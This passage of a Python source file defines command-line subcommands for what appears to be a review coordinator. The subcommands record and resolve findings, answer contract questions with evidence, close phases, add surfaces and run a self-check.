    record.add_argument("--severity", required=True, choices=SEVERITIES)
    record.add_argument("--summary", required=True)
    record.add_argument("--evidence", required=True, help="path or path:line proving the finding")
    record.add_argument(
        "--remedy",
        help="the change that would resolve this finding, when the review already knows it",
    )
    record.set_defaults(handler=command_record_finding)

    resolve = subparsers.add_parser("resolve-finding", help="give one finding an explicit disposition")
    resolve.add_argument("--run-dir", type=Path, required=True)
    resolve.add_argument("--id", required=True)
    resolve.add_argument("--disposition", required=True, choices=DISPOSITIONS)
    resolve.add_argument("--note", required=True)
    resolve.set_defaults(handler=command_resolve_finding)

    answer = subparsers.add_parser("answer", help="settle one contract question with evidence")
    answer.add_argument("--run-dir", type=Path, required=True)
    answer.add_argument("--question", required=True, help="question id, as shown by status")
    answer.add_argument("--verdict", required=True, choices=VERDICTS)
    answer.add_argument("--evidence", required=True, help="a path, a path and line, or a command and its result")
    answer.add_argument("--finding", help="the finding recording this defect; required when the verdict is violated")
    answer.set_defaults(handler=command_answer)

    complete = subparsers.add_parser("complete-phase", help="close the current phase with a decision note")
    complete.add_argument("--run-dir", type=Path, required=True)
    complete.add_argument("--phase", required=True)
    complete.add_argument("--note", required=True)
    complete.set_defaults(handler=command_complete_phase)

    add = subparsers.add_parser("add-surface", help="add a surface discovered mid-run")
    add.add_argument("--run-dir", type=Path, required=True)
    add.add_argument("--surface", required=True)
    add.set_defaults(handler=command_add_surface)

    check = subparsers.add_parser("self-check", help="verify coordinator behavior and exit")
    check.set_defaults(handler=command_self_check)

    return parser


def main():
    arguments = parser().parse_args()
    arguments.handler(arguments)


if __name__ == "__main__":
    run_cli(main)
